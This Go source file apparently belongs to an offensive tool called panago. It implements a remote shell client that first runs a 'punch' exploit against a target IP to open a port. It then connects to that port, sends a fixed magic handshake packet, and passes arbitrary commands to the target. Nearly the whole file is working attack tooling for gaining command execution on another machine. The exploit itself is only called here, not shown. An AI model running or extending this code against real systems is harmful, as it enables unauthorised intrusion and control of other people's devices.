package shell

import (
	"fmt"
	"io"
	"net"
	"time"

	"github.com/tridentsx/panago/internal/exploit"
)

// MagicPacket is the handshake packet sent to establish the shell connection
var MagicPacket = []byte{
	0x9f, 0xbe, 0x9b, 0x17, 0x3b, 0x18, 0xee, 0x01,
	0x82, 0xea, 0x35, 0x9f, 0xa7, 0x60, 0x12, 0x4c,
}

// ShellConn implements the Shell interface
type ShellConn struct {
	conn net.Conn
}

// New creates a new shell session
func New(targetIP string) (Shell, error) {
	// First execute the punch exploit
	punch := exploit.NewPunchExploit(targetIP)
	port, err := punch.Execute("SHELL")
	if err != nil {
		return nil, fmt.Errorf("exploit failed: %w", err)
	}

	// Connect to the opened port
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, port), time.Second*2)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to shell: %w", err)
	}

	shell := &ShellConn{conn: conn}

	// Perform shell handshake
	if err := shell.performHandshake(); err != nil {
		shell.Close()
		return nil, err
	}

	return shell, nil
}

// ExecuteCommand sends a command to the shell
func (s *ShellConn) ExecuteCommand(cmd string) error {
	_, err := s.conn.Write([]byte(cmd + "\n"))
	return err
}

// GetOutput gets the command output
func (s *ShellConn) GetOutput() (io.Reader, error) {
	return s.conn, nil
}

// Close closes the shell session
func (s *ShellConn) Close() error {
	return s.conn.Close()
}

// performHandshake handles the shell-specific handshake
func (s *ShellConn) performHandshake() error {
	// Send magic packet
	_, err := s.conn.Write(MagicPacket)
	if err != nil {
		return fmt.Errorf("handshake failed: %w", err)
	}

	// Read response
	resp := make([]byte, 1024)
	n, err := s.conn.Read(resp)
	if err != nil {
		return err
	}

	line := string(resp[:n])
	if line != "ok\n" {
		return fmt.Errorf("invalid handshake response: %s", line)
	}

	return nil
}

// Add the Connect method to implement the Shell interface
func (s *ShellConn) Connect(target string) error {
	// Since we handle connection in New(), this is a no-op
	return nil
}
